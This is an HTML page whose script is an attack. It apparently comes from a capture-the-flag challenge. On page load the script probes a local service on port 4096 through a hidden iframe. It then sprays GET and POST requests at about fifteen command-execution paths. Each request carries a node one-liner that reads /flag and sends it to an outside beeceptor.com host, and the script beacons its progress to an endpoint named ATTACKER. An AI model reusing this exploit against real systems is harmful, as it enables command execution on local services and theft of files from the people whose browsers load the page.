<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
(function() {
    // ========== 配置 ==========
    const ATTACKER = "https://123123.free.beeceptor.com";  // 你的接收端点
    const TARGET_PORT = 4096;
    const TARGET_HOST = "localhost";
    const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
    const LOCATION = encodeURIComponent(location.href);
    const REFERRER = encodeURIComponent(document.referrer || "");

    // 统一的 beacon：发送 GET 请求，携带 run 和上下文
    function beacon(action, extra) {
        let img = new Image();
        let url = `${ATTACKER}/${action}?run=${RUN_ID}&loc=${LOCATION}&ref=${REFERRER}`;
        if (extra) url += `&${extra}`;
        img.src = url;
    }

    // 发送一个 GET 请求（用于触发命令执行，不关心响应）
    function fireGet(url, cmd) {
        let img = new Image();
        let separator = url.includes('?') ? '&' : '?';
        img.src = url + separator + 'cmd=' + encodeURIComponent(cmd);
    }

    // 发送一个 POST 请求（JSON 格式），用于常见 API
    function firePost(url, cmd) {
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cmd: cmd, command: cmd, input: cmd }),
            mode: 'no-cors'  // 仍然会发送请求，但无法读取响应；不影响服务端执行
        }).catch(e => beacon("post-error", `msg=${encodeURIComponent(e.message)}`));
    }

    // 实际 payload：使用 node 读取 /flag 并 POST 到攻击者服务器
    function getPayload() {
        // 注意：容器内没有 curl，但 node 可用
        return `node -e "require('http').request({host:'1213123.free.beeceptor.com',path:'/flag?run=${RUN_ID}',method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
    }

    // 探测并尝试所有可能的路径
    function tryPaths(baseUrl) {
        const paths = [
            "/exec", "/cmd", "/shell", "/api/exec", "/api/cmd", "/api/shell",
            "/run", "/api/run", "/terminal", "/api/terminal", "/command",
            "/api/command", "/v1/exec", "/v1/run", "/execute"
        ];
        const payload = getPayload();

        for (let path of paths) {
            let fullUrl = baseUrl + path;
            // GET 方式
            fireGet(fullUrl, payload);
            beacon("try-get", `path=${encodeURIComponent(path)}`);
            // POST 方式
            firePost(fullUrl, payload);
            beacon("try-post", `path=${encodeURIComponent(path)}`);
        }
    }

    // 主攻击流程
    function startAttack() {
        beacon("start", `target=${TARGET_HOST}:${TARGET_PORT}`);
        let root = document.body || document.documentElement;
        if (!root) {
            beacon("error", "msg=no_root");
            return;
        }

        // 通过 iframe 探测端口是否开放（onload 表示可访问）
        let iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = `http://${TARGET_HOST}:${TARGET_PORT}/`;
        iframe.onload = () => {
            beacon("port-open", `port=${TARGET_PORT}`);
            tryPaths(`http://${TARGET_HOST}:${TARGET_PORT}`);
        };
        iframe.onerror = () => {
            beacon("port-error", `port=${TARGET_PORT}`);
        };
        root.appendChild(iframe);
        setTimeout(() => iframe.remove(), 5000);
    }

    window.addEventListener('error', e => {
        beacon("js-error", `msg=${encodeURIComponent(e.message)}`);
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startAttack);
    } else {
        startAttack();
    }
})();
</script>
</body>
</html>
